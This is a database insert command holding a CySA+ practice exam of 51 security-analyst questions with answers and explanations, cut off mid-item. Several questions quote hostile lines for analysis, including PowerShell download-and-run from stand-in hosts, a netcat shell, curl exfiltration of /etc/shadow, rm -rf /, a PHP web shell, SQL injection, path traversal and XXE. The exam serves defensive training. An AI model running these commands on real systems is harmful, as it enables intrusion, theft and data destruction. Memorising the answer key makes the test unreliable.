db.tests.insertOne({
  "category": "cysa",
  "testId": 5,
  "testName": "CySa+ Practice Test #5 (Intermediate)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "You are reviewing SIEM alerts and find the following log entries:\n\nFeb 25 11:32:15 webserver sshd[1024]: Accepted password for user admin from 203.0.113.50 port 51234 ssh2\nFeb 25 11:32:18 webserver kernel: Outbound connection established to 198.51.100.12:4444\nFeb 25 11:32:20 webserver sshd[1024]: Accepted password for user admin from 10.0.1.45 port 44321 ssh2\n\nWhat is the MOST likely concern indicated by these logs?",
      "options": [
        "Successful brute force attack on admin credentials",
        "Suspicious C2 communication after remote access",
        "Legitimate administrative login from multiple locations",
        "Misconfigured firewall allowing external SSH access"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The outbound connection to port 4444 (commonly used by remote shells like Metasploit) immediately after an external SSH login suggests C2 activity.",
      "examTip": "Unusual outbound connections immediately after authentication often indicate C2 activity."
    },
    {
      "id": 2,
      "question": "Your vulnerability scan reports the following:\n- CVE-2024-XXXX (CVSS Score: 8.0 - High)\n- Exploitable remotely without authentication\n- Affects critical web application servers\n- Vendor patch available, but business leaders insist on scheduled maintenance in two weeks\n\nWhich compensating control would MOST effectively reduce risk until patching?",
      "options": [
        "Implement Web Application Firewall (WAF) rules to block exploit patterns",
        "Increase monitoring frequency of affected systems",
        "Apply temporary ACLs restricting public access to vulnerable systems",
        "Conduct penetration testing to determine exploit feasibility"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Restricting network access reduces exposure, especially for remotely exploitable vulnerabilities.",
      "examTip": "When immediate patching isn’t possible, limit exposure using network segmentation or ACLs."
    },
    {
      "id": 3,
      "question": "A new threat intelligence report indicates that an APT group uses the following techniques:\n- Spear-phishing emails with malicious attachments\n- PowerShell scripts for lateral movement\n- DNS tunneling for C2 communication\n\nWhich indicator would provide the STRONGEST evidence of active compromise in your environment?",
      "options": [
        "Suspicious PowerShell executions with '-enc' parameters",
        "Outbound DNS queries with random subdomain patterns",
        "Delivery of emails with known malicious attachment hashes",
        "Multiple failed login attempts across several endpoints"
      ],
      "correctAnswerIndex": 1,
      "explanation": "DNS tunneling for C2 is a direct sign of active compromise, indicating that malware is communicating externally.",
      "examTip": "Active external communication (like DNS tunneling) often confirms an ongoing compromise."
    },
    {
      "id": 4,
      "question": "The SIEM generated an alert based on the following correlation rule:\n\nIF (process_name = \"powershell.exe\") AND \n   (command_line CONTAINS \"-enc\" OR \"IEX\") AND\n   (network_connection TO known_malicious_IP)\nTHEN ALERT\n\nWhich MITRE ATT&CK tactic is BEST represented by this rule?",
      "options": [
        "Defense Evasion",
        "Execution",
        "Command and Control (C2)",
        "Persistence"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Obfuscated PowerShell commands combined with connections to known malicious IPs strongly indicate C2 activity.",
      "examTip": "Look for external connections in SIEM alerts—key signs of C2 behavior."
    },
    {
      "id": 5,
      "question": "A suspicious file is detonated in a sandbox, and the following behaviors are observed:\n- Spawns multiple child processes\n- Connects to IP 198.51.100.15 on port 8080\n- Encrypts user directories and displays a ransom note\n\nWhat type of malware does this behavior MOST likely represent?",
      "options": [
        "Trojan",
        "Ransomware",
        "Worm",
        "Rootkit"
      ],
      "correctAnswerIndex": 1,
      "explanation": "The encryption of files and ransom note is definitive ransomware behavior.",
      "examTip": "Ransomware behavior includes rapid encryption processes and attempts to disable security mechanisms."
    },
    {
      "id": 6,
      "question": "A network scan shows that port 3389 (RDP) is open on a critical server, and it is accessible from the internet. The organization does not permit RDP access externally.\n\nWhat is the MOST appropriate immediate action?",
      "options": [
        "Disable external RDP access at the firewall level",
        "Monitor traffic on port 3389 for suspicious patterns",
        "Apply the latest security patches to the server",
        "Notify stakeholders about the open RDP port"
      ],
      "correctAnswerIndex": 0,
      "explanation": "External RDP exposure is a significant attack vector. Immediate action involves blocking it at the firewall to prevent unauthorized access.",
      "examTip": "External RDP exposure is highly risky—block first, investigate later."
    },
    {
      "id": 7,
      "question": "Review the following email header snippet:\n\nReceived-SPF: fail (maliciousdomain.com: 192.0.2.1 is not permitted sender)\nAuthentication-Results: dmarc=fail header.from=maliciousdomain.com\n\nWhat does this indicate?",
      "options": [
        "Spoofed email likely used in a phishing attempt",
        "Legitimate email from a trusted domain",
        "Misconfigured SPF and DMARC settings on the sender's side",
        "Business email compromise (BEC) attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SPF and DMARC failures strongly suggest that the email sender is spoofed—common in phishing campaigns.",
      "examTip": "SPF and DMARC failures are red flags for spoofed or malicious emails."
    },
    {
      "id": 8,
      "question": "A vulnerability report shows:\n- CVSS Score: 9.0 (Critical)\n- Attack vector: Network\n- Privileges required: None\n- User interaction: None\n\nWhy is this vulnerability considered critical?",
      "options": [
        "It can be exploited remotely without user action or elevated privileges",
        "It affects user-level applications only, posing minimal risk",
        "It requires user interaction to execute malicious payloads",
        "It affects only internal systems with limited access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Vulnerabilities that are remotely exploitable without user interaction or authentication are highly critical due to their ease of exploitation.",
      "examTip": "Remote, unauthenticated, no-user-interaction vulnerabilities are top remediation priorities."
    },
    {
      "id": 9,
      "question": "During threat hunting, the following PowerShell command is observed:\n\npowershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-ip.com/script.ps1')\"\n\nWhat is the attacker's objective with this command?",
      "options": [
        "Download and execute malicious code in memory",
        "Bypass user account controls (UAC) for privilege escalation",
        "Scan the local network for vulnerable devices",
        "Establish a persistent foothold using startup scripts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The PowerShell command downloads and executes a script in memory, a common tactic to avoid detection by traditional antivirus tools.",
      "examTip": "Commands using `IEX` and `DownloadString` are strong indicators of fileless malware attacks."
    },
    {
      "id": 10,
      "question": "A forensic analysis of a compromised endpoint reveals registry modifications at:\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nWhat does this most likely indicate?",
      "options": [
        "Persistence mechanism allowing malware to run at startup",
        "Privilege escalation through registry manipulation",
        "Attempted bypass of Windows security features",
        "Temporary storage of encryption keys for ransomware"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Modifications to the 'Run' registry key are a common persistence technique, ensuring malware execution after reboot.",
      "examTip": "Persistence indicators often involve autorun entries in registry keys like 'Run' or 'RunOnce'."
    },
    {
      "id": 11,
      "question": "A SOC analyst notices repeated failed login attempts followed by a successful login for an admin account from an unfamiliar external IP. Shortly after, the same account initiates data transfers to an external server.\n\nWhat is the MOST LIKELY explanation for this activity?",
      "options": [
        "Credential compromise followed by data exfiltration",
        "Insider threat exfiltrating sensitive data",
        "Misconfigured VPN allowing unauthorized access",
        "Brute force attack with successful privilege escalation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Repeated failed logins followed by successful access and external data transfers strongly suggest credential compromise and data exfiltration.",
      "examTip": "Monitor for unusual login patterns, especially followed by outbound data transfers."
    },
    {
      "id": 12,
      "question": "During a routine vulnerability scan, an outdated Apache Struts instance is detected with known remote code execution vulnerabilities. Patching is scheduled but cannot occur immediately.\n\nWhat is the MOST effective temporary mitigation?",
      "options": [
        "Apply Web Application Firewall (WAF) rules to block exploit attempts",
        "Increase monitoring of Apache Struts logs for unusual activity",
        "Disable all external access to the affected server",
        "Conduct penetration testing to evaluate exploit feasibility"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Applying WAF rules to block known exploit patterns provides immediate protection while awaiting permanent patching.",
      "examTip": "Use WAFs as compensating controls when patching critical web services is delayed."
    },
    {
      "id": 13,
      "question": "A cloud storage bucket containing sensitive data was accidentally configured for public access. No known malicious access has occurred.\n\nWhich action should be taken FIRST to mitigate the risk?",
      "options": [
        "Restrict access permissions immediately to authorized users only",
        "Enable server-side encryption on all stored objects",
        "Set up logging and alerting for all bucket access events",
        "Rotate access credentials for all associated services"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Restricting access is the highest priority to prevent potential unauthorized access while further security measures are implemented.",
      "examTip": "Public access misconfigurations are a top cloud security risk—lock them down immediately."
    },
    {
      "id": 14,
      "question": "You detect a PowerShell script running with the following parameters:\n\npowershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/loader.ps1')\"\n\nWhat defensive action would MOST effectively prevent this type of attack in the future?",
      "options": [
        "Implement application whitelisting to block unauthorized PowerShell execution",
        "Block outbound HTTP traffic at the firewall for all non-whitelisted domains",
        "Deploy an endpoint detection and response (EDR) solution to monitor PowerShell",
        "Force PowerShell scripts to run in constrained language mode"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Application whitelisting ensures only authorized scripts and binaries run, preventing unauthorized PowerShell execution.",
      "examTip": "Application whitelisting is a highly effective method for blocking fileless malware techniques."
    },
    {
      "id": 15,
      "question": "A vulnerability scanner flags an internally accessible service using SMBv1. The organization’s policy requires all deprecated protocols to be disabled immediately.\n\nWhat is the PRIMARY reason for disabling SMBv1?",
      "options": [
        "It is vulnerable to ransomware attacks like WannaCry",
        "It consumes excessive bandwidth, affecting network performance",
        "It lacks encryption, risking credential interception",
        "It is prone to misconfigurations leading to denial-of-service (DoS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMBv1 is outdated and was exploited by ransomware like WannaCry; disabling it removes a major attack vector.",
      "examTip": "Disable legacy protocols (e.g., SMBv1) known for critical vulnerabilities."
    },
    {
      "id": 16,
      "question": "A threat hunter identifies consistent DNS queries from an endpoint to random subdomains of a suspicious domain, e.g., a1b2c3d4.evil-domain.com.\n\nWhich threat behavior does this MOST likely indicate?",
      "options": [
        "Domain Generation Algorithm (DGA) used for malware persistence",
        "DNS poisoning attempts redirecting traffic to malicious servers",
        "Beaconing to a Command-and-Control (C2) server using DNS tunneling",
        "Malware reconnaissance scanning external DNS servers"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA malware generates random domain names to maintain C2 connectivity despite domain takedowns.",
      "examTip": "Random domain patterns in DNS logs often point to DGA-based malware communication."
    },
    {
      "id": 17,
      "question": "A penetration tester uploads a file to a web server using the following payload:\n\n<?php system($_GET['cmd']); ?>\n\nWhich vulnerability does this demonstrate?",
      "options": [
        "Remote code execution via unrestricted file upload",
        "Directory traversal allowing access to sensitive files",
        "SQL injection leading to database compromise",
        "Cross-site scripting (XSS) for stealing session tokens"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The PHP code allows the attacker to execute arbitrary system commands, demonstrating a remote code execution flaw.",
      "examTip": "Implement strict file validation and avoid executing user-uploaded files on web servers."
    },
    {
      "id": 18,
      "question": "A SIEM generates alerts after detecting a PowerShell command containing '-enc' and suspicious outbound traffic.\n\nWhat is the MOST likely objective of the attacker?",
      "options": [
        "Obfuscated execution of malicious commands for C2 communication",
        "Privilege escalation through local Windows exploits",
        "Credential harvesting from memory using Mimikatz",
        "Persistence establishment by modifying registry keys"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '-enc' flag suggests obfuscated PowerShell execution, while outbound traffic indicates possible C2 activity.",
      "examTip": "Obfuscated PowerShell commands combined with external communication often signal C2 operations."
    },
    {
      "id": 19,
      "question": "A forensic team analyzes a compromised endpoint and finds the following:\n- Outbound connections to IP 198.51.100.100 over port 8080\n- Modified Windows registry keys related to startup processes\n- Suspicious DLLs loaded into critical system processes\n\nWhich MITRE ATT&CK tactic is MOST represented by these findings?",
      "options": [
        "Persistence",
        "Privilege Escalation",
        "Defense Evasion",
        "Initial Access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Modifying registry keys for startup processes is a common persistence technique, allowing malware to survive reboots.",
      "examTip": "Persistence tactics ensure malware execution after system reboots or logouts."
    },
    {
      "id": 20,
      "question": "During a red team assessment, the following SQL payload is used:\n\nSELECT * FROM users WHERE username='admin' AND password='' OR '1'='1';\n\nWhat is the PRIMARY goal of this payload?",
      "options": [
        "Bypass authentication controls via SQL injection",
        "Enumerate all user accounts within the database",
        "Perform privilege escalation within the application",
        "Extract hashed passwords for offline brute force attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The 'OR '1'='1'' condition bypasses authentication by always evaluating as true, granting unauthorized access.",
      "examTip": "Use parameterized queries to defend against SQL injection authentication bypasses."
    },
    {
      "id": 21,
      "question": "An attacker sends the following HTTP request to a vulnerable web application:\n\nGET /index.php?page=../../../../etc/passwd HTTP/1.1\nHost: vulnerable-website.com\n\nWhich vulnerability is being exploited?",
      "options": [
        "Directory traversal",
        "Remote file inclusion (RFI)",
        "Cross-site scripting (XSS)",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '../../' sequence is used to traverse directories and access sensitive files, indicating a directory traversal attack.",
      "examTip": "Sanitize user input and restrict file access to prevent directory traversal vulnerabilities."
    },
    {
      "id": 22,
      "question": "A security analyst detects the following log entry:\n\nFeb 26 10:22:45 server sshd[1124]: Accepted publickey for user1 from 192.0.2.50 port 60212\nFeb 26 10:22:48 server kernel: Outbound connection established to 203.0.113.45:12345\n\nWhat is the MOST suspicious activity in this log?",
      "options": [
        "Outbound connection to a high-numbered port after SSH login",
        "Public key authentication from a known IP address",
        "SSH login during business hours",
        "Kernel-level logging of network connections"
      ],
      "correctAnswerIndex": 0,
      "explanation": "An outbound connection to an unusual port (12345) right after a login suggests possible C2 communication.",
      "examTip": "Monitor outbound traffic patterns, especially after authentication events, for signs of C2 activity."
    },
    {
      "id": 23,
      "question": "A threat hunter discovers multiple internal endpoints resolving DNS queries for randomly generated subdomains without follow-up traffic.\n\nWhat is the MOST likely explanation for this behavior?",
      "options": [
        "Malware using a Domain Generation Algorithm (DGA)",
        "DNS cache poisoning in progress",
        "Phishing attack utilizing malicious DNS entries",
        "Reconnaissance for open DNS resolvers"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Frequent DNS queries for random subdomains suggest DGA usage, where malware generates domains for C2 communication.",
      "examTip": "Investigate repeated DNS queries to random domains—often an indicator of DGA-based malware."
    },
    {
      "id": 24,
      "question": "A web application allows users to upload images. A penetration tester successfully uploads a PHP file disguised as an image, which executes server-side code.\n\nWhich security weakness enabled this attack?",
      "options": [
        "Unrestricted file upload",
        "Broken access control",
        "Cross-site request forgery (CSRF)",
        "Improper session management"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Allowing users to upload files without validating file type or content can result in remote code execution via unrestricted file upload vulnerabilities.",
      "examTip": "Validate file extensions and use MIME type checks to prevent file upload exploits."
    },
    {
      "id": 25,
      "question": "The following SQL query is used in a web application:\n\nSELECT * FROM users WHERE username = '$username' AND password = '$password';\n\nWhich security measure BEST prevents SQL injection in this scenario?",
      "options": [
        "Using prepared statements with parameterized queries",
        "Escaping special characters in user input",
        "Implementing web application firewalls (WAF)",
        "Applying strong password complexity requirements"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Prepared statements ensure that user input is treated as data rather than executable SQL, effectively preventing injection attacks.",
      "examTip": "Always use parameterized queries to defend against SQL injection."
    },
    {
      "id": 26,
      "question": "A compromised endpoint repeatedly attempts outbound connections on port 53 with large DNS payloads.\n\nWhich technique is MOST likely being used by the attacker?",
      "options": [
        "DNS tunneling for data exfiltration",
        "Beaconing to a C2 server via HTTP",
        "DNS amplification for DDoS attacks",
        "Exploitation of DNS poisoning vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Large DNS payloads sent repeatedly indicate DNS tunneling, which allows covert data exfiltration or C2 communication.",
      "examTip": "Monitor for large or unusual DNS requests, which can signal tunneling activity."
    },
    {
      "id": 27,
      "question": "During an internal security review, a critical server is found to be using default administrator credentials.\n\nWhich risk is MOST associated with this misconfiguration?",
      "options": [
        "Unauthorized remote access leading to privilege escalation",
        "Denial-of-service (DoS) through brute force attacks",
        "Man-in-the-middle (MITM) interception of administrator traffic",
        "Data loss due to improper encryption configuration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Default credentials can be easily exploited, leading to unauthorized access and potential privilege escalation.",
      "examTip": "Always change default credentials during initial system configuration."
    },
    {
      "id": 28,
      "question": "A penetration tester observes the following command during testing:\n\nnc -lvp 4444 -e /bin/bash\n\nWhat is the MOST LIKELY purpose of this command?",
      "options": [
        "Set up a listener to provide a reverse shell to the attacker",
        "Scan a target network for open ports and services",
        "Download malicious payloads from an external server",
        "Generate a hash of sensitive files for exfiltration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The 'nc' (Netcat) command is setting up a listener on port 4444 to execute /bin/bash, creating a reverse shell for remote control.",
      "examTip": "Netcat is commonly used for reverse shells—monitor for unexpected listeners on high-numbered ports."
    },
    {
      "id": 29,
      "question": "A critical vulnerability is disclosed for a widely used web server. The vendor has not released a patch yet. The system is internet-facing and critical to business operations.\n\nWhich immediate action MOST reduces the risk of exploitation?",
      "options": [
        "Restrict network access using firewall rules to trusted IPs",
        "Monitor logs for exploit indicators related to the vulnerability",
        "Temporarily shut down the affected server until patching is possible",
        "Conduct internal penetration testing to assess exploitability"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Restricting access using firewall rules reduces exposure to potential attackers while waiting for a vendor patch.",
      "examTip": "When patches are unavailable, limit external exposure as a top priority."
    },
    {
      "id": 30,
      "question": "During a threat investigation, a malware sample demonstrates the following behavior:\n- Creates scheduled tasks with SYSTEM privileges\n- Establishes outbound connections on port 8080\n- Modifies Windows Defender settings\n\nWhat type of malware does this MOST likely represent?",
      "options": [
        "Trojan establishing persistence and C2 communication",
        "Rootkit designed to hide malicious processes",
        "Ransomware preparing for file encryption",
        "Worm attempting lateral movement in the network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The behavior indicates a Trojan maintaining persistent access and establishing command-and-control communication with an external server.",
      "examTip": "Persistence mechanisms like scheduled tasks combined with C2 traffic are typical Trojan characteristics."
    },
    {
      "id": 31,
      "question": "A threat analyst identifies a Python script on a compromised endpoint with the following snippet:\n\nimport os\nos.system(\"rm -rf / --no-preserve-root\")\n\nWhat is the PRIMARY risk associated with this code?",
      "options": [
        "Destructive command that deletes all files on the system",
        "Privilege escalation via system-level command execution",
        "Remote code execution vulnerability in the Python interpreter",
        "Data exfiltration through unauthorized file access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command `rm -rf / --no-preserve-root` recursively deletes all files on the system, resulting in total data loss.",
      "examTip": "Audit scripts for destructive commands—especially those affecting critical directories like '/'."
    },
    {
      "id": 32,
      "question": "A SIEM generates alerts for repeated outbound connections from an internal host to an external IP over port 4444 with minimal data transfer.\n\nWhat is this activity MOST likely indicative of?",
      "options": [
        "Command-and-control (C2) beaconing",
        "Data exfiltration using covert channels",
        "Distributed Denial-of-Service (DDoS) attack preparation",
        "Lateral movement across the internal network"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 4444 is commonly used for reverse shells and C2 communication; low-volume outbound connections are typical of C2 beaconing.",
      "examTip": "Monitor outbound connections on uncommon ports like 4444—often linked to remote access tools."
    },
    {
      "id": 33,
      "question": "A security engineer observes that an internal server is making DNS requests for domains like `z1a2b3c4.evil-domain.com` and `a9d8c7b6.malicious-domain.net` without subsequent HTTP traffic.\n\nWhat should be the engineer's FIRST action?",
      "options": [
        "Investigate for Domain Generation Algorithm (DGA) malware",
        "Block all DNS requests to suspicious external domains",
        "Perform a packet capture to analyze DNS payloads",
        "Reimage the compromised server to restore operations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Random domain queries without follow-up traffic are strong indicators of DGA malware attempting to contact its C2 servers.",
      "examTip": "Unusual DNS queries to randomized domains are classic signs of DGA-based malware behavior."
    },
    {
      "id": 34,
      "question": "A web application displays the following URL after a user login:\n\nhttps://example.com/dashboard?user=admin\n\nWhich vulnerability would MOST LIKELY allow an attacker to gain unauthorized access by modifying this URL?",
      "options": [
        "Insecure Direct Object Reference (IDOR)",
        "Cross-site request forgery (CSRF)",
        "SQL injection",
        "Cross-site scripting (XSS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "IDOR vulnerabilities occur when user-controlled input (e.g., `user=admin`) grants access without proper authorization checks.",
      "examTip": "Always enforce server-side authorization checks for user-controlled input to prevent IDOR attacks."
    },
    {
      "id": 35,
      "question": "An attacker uses the following curl command:\n\ncurl -X POST -d @/etc/shadow http://malicious-server.com/upload\n\nWhat is the attacker's objective?",
      "options": [
        "Exfiltration of sensitive credential files",
        "Brute force password cracking using shadow file hashes",
        "Privilege escalation by modifying authentication settings",
        "Triggering a denial-of-service (DoS) on the remote server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `/etc/shadow` file contains hashed credentials; posting it to an external server indicates data exfiltration.",
      "examTip": "Monitor outbound POST requests for sensitive file transfers—common in exfiltration attempts."
    },
    {
      "id": 36,
      "question": "A sandbox analysis of a malware sample shows:\n- Attempts to disable Windows Defender\n- Creation of a hidden administrator account\n- Outbound communication to multiple IPs on port 8080\n\nWhich type of malware does this behavior BEST represent?",
      "options": [
        "Trojan enabling persistent remote access",
        "Rootkit hiding malicious system-level processes",
        "Ransomware preparing for file encryption",
        "Worm propagating across networked systems"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The creation of admin accounts and attempts to disable security features are characteristic of Trojans aiming for persistent access.",
      "examTip": "Trojans typically exhibit persistence tactics like hidden user creation and security tool disablement."
    },
    {
      "id": 37,
      "question": "During a cloud security review, an AWS S3 bucket containing sensitive data is found to have public read/write permissions.\n\nWhat is the MOST immediate action to secure this resource?",
      "options": [
        "Restrict bucket permissions to authorized users only",
        "Enable encryption at rest using AWS KMS-managed keys",
        "Configure logging and monitoring for all access attempts",
        "Implement CloudFront distribution with signed URLs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Publicly accessible S3 buckets are a major risk; restricting permissions prevents unauthorized access immediately.",
      "examTip": "Default deny-all policies for cloud storage prevent accidental data exposures."
    },
    {
      "id": 38,
      "question": "A SOC analyst detects an endpoint making frequent outbound connections to port 53 with base64-encoded DNS TXT records.\n\nWhat technique is MOST likely being used by the threat actor?",
      "options": [
        "DNS tunneling for covert data exfiltration",
        "Command-and-control (C2) beaconing via DNS requests",
        "Domain Generation Algorithm (DGA) for malware persistence",
        "DNS amplification attack targeting external networks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Base64-encoded DNS TXT records in outbound queries are typical of DNS tunneling, used for covert data exfiltration or C2 communication.",
      "examTip": "Analyze DNS logs for large or encoded TXT record queries—often indicative of tunneling activities."
    },
    {
      "id": 39,
      "question": "A penetration tester discovers that a web application's session tokens remain valid after user logout.\n\nWhich risk does this behavior introduce?",
      "options": [
        "Session hijacking",
        "Cross-site scripting (XSS)",
        "Broken authentication",
        "Cross-site request forgery (CSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Persistent session tokens after logout enable attackers to hijack sessions and impersonate users.",
      "examTip": "Ensure session tokens expire immediately after logout to prevent hijacking risks."
    },
    {
      "id": 40,
      "question": "A vulnerability report shows:\n- CVSS Score: 9.8 (Critical)\n- Exploitable remotely without authentication\n- No vendor patch available yet\n- Internet-facing web server affected\n\nWhich compensating control BEST reduces the risk until a patch is released?",
      "options": [
        "Restrict external access to the server using firewall rules",
        "Monitor web server logs for indicators of compromise",
        "Apply virtual patching through a Web Application Firewall (WAF)",
        "Isolate the server from the network to prevent exposure"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Virtual patching via a WAF provides immediate protection against known exploits when a vendor patch isn't available.",
      "examTip": "Use WAFs for rapid response to web application vulnerabilities awaiting vendor fixes."
    },
    {
      "id": 41,
      "question": "A security analyst reviews web server logs and notices the following entry:\n\n192.168.1.20 - - [26/Feb/2025:15:10:15 +0000] \"GET /index.php?page=../../../../etc/shadow HTTP/1.1\" 200 512\n\nWhat type of attack does this log entry indicate?",
      "options": [
        "Directory traversal",
        "Remote code execution",
        "SQL injection",
        "Cross-site scripting (XSS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '../../../../etc/shadow' path is indicative of a directory traversal attack attempting to access sensitive files.",
      "examTip": "Use input validation and web server configurations to prevent directory traversal attacks."
    },
    {
      "id": 42,
      "question": "During incident response, an analyst discovers that an attacker established persistence by creating a new user with administrative privileges on a compromised endpoint.\n\nWhich defensive measure would BEST prevent this type of persistence?",
      "options": [
        "Implement privileged access management (PAM) controls",
        "Disable local administrator accounts by default",
        "Apply network segmentation for administrative hosts",
        "Force periodic password rotations for all user accounts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "PAM solutions restrict and monitor administrative account usage, preventing unauthorized privilege assignments.",
      "examTip": "Privileged access management is essential for controlling administrator-level persistence tactics."
    },
    {
      "id": 43,
      "question": "A security operations center (SOC) analyst detects the following behavior on an endpoint:\n- PowerShell executed with '-ExecutionPolicy Bypass'\n- Outbound HTTP connection to a suspicious domain\n- In-memory execution of a downloaded script\n\nWhat type of attack is MOST LIKELY occurring?",
      "options": [
        "Fileless malware execution",
        "Privilege escalation using PowerShell exploits",
        "Ransomware encryption staging",
        "Credential harvesting using Mimikatz"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The combination of in-memory PowerShell execution and bypassing execution policy strongly indicates fileless malware activity.",
      "examTip": "Fileless malware often leverages PowerShell and in-memory execution—monitor for suspicious command-line usage."
    },
    {
      "id": 44,
      "question": "A cloud engineer identifies that several AWS EC2 instances are communicating with a known malicious IP over port 22. The organization does not use SSH externally.\n\nWhat should be the FIRST step to contain the incident?",
      "options": [
        "Isolate affected EC2 instances from the network",
        "Rotate SSH keys and disable existing credentials",
        "Conduct forensic analysis of EC2 instance logs",
        "Update security group rules to block outbound SSH traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Immediate isolation of affected instances prevents further communication with the malicious IP, containing the threat.",
      "examTip": "Containment through isolation is always the top priority during active compromises."
    },
    {
      "id": 45,
      "question": "A penetration tester discovers the following HTTP response header:\n\nHTTP/1.1 200 OK\nSet-Cookie: sessionid=abcd1234; HttpOnly\n\nWhat does the 'HttpOnly' attribute achieve in this context?",
      "options": [
        "Prevents client-side scripts from accessing the cookie",
        "Encrypts the cookie during transmission",
        "Prevents the cookie from being sent over unsecured HTTP",
        "Ensures the cookie expires after the session ends"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The 'HttpOnly' flag prevents JavaScript from accessing the cookie, mitigating the risk of XSS-related session theft.",
      "examTip": "Always set 'HttpOnly' for session cookies to protect against client-side script attacks."
    },
    {
      "id": 46,
      "question": "A network engineer observes large volumes of ICMP traffic originating from multiple internal hosts and destined for a single external IP.\n\nWhat type of attack is MOST LIKELY occurring?",
      "options": [
        "Distributed Denial-of-Service (DDoS) attack using ICMP flood",
        "Man-in-the-middle (MITM) attack intercepting ICMP packets",
        "Reconnaissance scanning for live hosts using ping sweeps",
        "DNS amplification attack targeting external DNS servers"
      ],
      "correctAnswerIndex": 0,
      "explanation": "High volumes of ICMP traffic from multiple sources to a single destination suggest an ICMP flood DDoS attack.",
      "examTip": "ICMP floods overwhelm network resources—implement rate limiting and ICMP filtering to mitigate such attacks."
    },
    {
      "id": 47,
      "question": "A SOC analyst reviews authentication logs and observes multiple successful logins from geographically distant locations within minutes for the same user account.\n\nWhat security mechanism would MOST effectively prevent this attack?",
      "options": [
        "Multi-factor authentication (MFA)",
        "Geo-blocking based on user location",
        "Account lockout after failed login attempts",
        "Single sign-on (SSO) integration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "MFA requires additional verification factors, preventing unauthorized access even when credentials are compromised.",
      "examTip": "MFA is the most effective method for preventing credential compromise-based attacks."
    },
    {
      "id": 48,
      "question": "A vulnerability scanner detects that an internal web server is using TLS 1.0 for encrypted communications. The organization requires compliance with PCI DSS.\n\nWhy is this finding critical?",
      "options": [
        "TLS 1.0 is considered insecure and non-compliant with PCI DSS standards",
        "TLS 1.0 uses outdated key lengths that fail modern cryptographic checks",
        "TLS 1.0 lacks support for perfect forward secrecy (PFS)",
        "TLS 1.0 does not provide adequate protection against DDoS attacks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "PCI DSS requires the use of secure encryption protocols like TLS 1.2 or higher; TLS 1.0 is deprecated and insecure.",
      "examTip": "For PCI DSS compliance, always ensure encryption protocols are up-to-date and secure."
    },
    {
      "id": 49,
      "question": "An attacker successfully modifies a web application's query parameter to escalate their privileges:\n\nhttps://example.com/profile?role=user → https://example.com/profile?role=admin\n\nWhich vulnerability does this behavior MOST LIKELY represent?",
      "options": [
        "Broken access control",
        "Insecure direct object reference (IDOR)",
        "Cross-site request forgery (CSRF)",
        "Command injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Modifying a URL parameter to gain unauthorized access indicates broken access control due to improper privilege checks.",
      "examTip": "Always enforce robust server-side authorization checks to prevent privilege escalation via URL manipulation."
    },
    {
      "id": 50,
      "question": "A forensic investigation of a compromised host reveals the following PowerShell command:\n\npowershell.exe -nop -w hidden -enc SQBtAG0AbwByAHQAIABzAG8AbQBlACAAYwBvAGQAZQ==\n\nWhat technique is being used by the attacker?",
      "options": [
        "Obfuscated command execution using base64 encoding",
        "Privilege escalation through encoded payloads",
        "Credential harvesting from memory using obfuscated scripts",
        "Persistence establishment using encoded registry modifications"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '-enc' flag in PowerShell is used for base64-encoded commands, a common obfuscation method to bypass security controls.",
      "examTip": "Base64-encoded PowerShell commands are often used in obfuscation—monitor for the '-enc' flag in PowerShell logs."
    },
    {
      "id": 51,
      "question": "An attacker exploits a vulnerable web application by injecting the following payload:\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n\nWhich vulnerability does this represent?",
      "options": [
        "XML External Entity (XXE) injection",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Remote code execution"
      ],
      "correctAnswerIndex": 0,
